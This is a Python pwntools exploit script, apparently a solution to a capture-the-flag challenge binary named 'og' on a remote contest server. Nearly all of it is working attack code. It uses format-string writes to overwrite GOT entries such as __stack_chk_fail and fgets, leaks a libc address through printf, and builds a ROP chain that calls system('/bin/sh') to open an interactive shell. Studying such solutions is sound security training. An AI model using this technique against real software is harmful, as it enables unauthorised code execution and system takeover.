#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './og' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.actf.co', 31312 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *go+182
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(libc)
    
    # unlimited write if blowing the canary
    payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']: elf.sym['_start']}, write_size='short')
    io.sendlineafter('name: ', payload)
    
    # leak libc
    payload = b'%7$s||||'
    payload += p64(elf.got['printf'])
    payload += b'A' * (64 - len(payload))
    io.sendlineafter('name: ', payload)
    
    io.recvuntil(b', ')
    printf_leak = unpack(io.recv(6).ljust(8, b'\x00'))
    libc.address = printf_leak - libc.sym['printf']
    
    info('printf: ' + hex(printf_leak))
    info('libc: ' + hex(libc.address))
    
    payload = fmtstr_payload(6, {elf.got['fgets']: libc.sym['gets']}, write_size='short') # overwrite fgets with gets so no bounded inputs
    io.sendlineafter('name: ', payload)
    
    pop_rdi = rop.rdi.address + libc.address
    system = libc.sym['system']
    ret = rop.ret.address + libc.address
    binsh = next(libc.search(b'/bin/sh\x00'))
    
    print(f'pop_rdi: {hex(pop_rdi)}')
    print(f'binsh: {hex(binsh)}')
    print(f'ret: {hex(ret)}')
    print(f'system: {hex(system)}')
    
    # make __stack_chk_fail do nothing
    payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']: elf.sym['_init']}, write_size='short')
    payload += b'A' * (56 - len(payload))
    payload += p64(elf.sym['_start'])
    io.sendlineafter('name: ', payload)
    
    payload = flat({
        56: [
            pop_rdi,
            binsh,
            ret,
            system
        ]
    })
    
    io.sendlineafter('name: ', payload)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()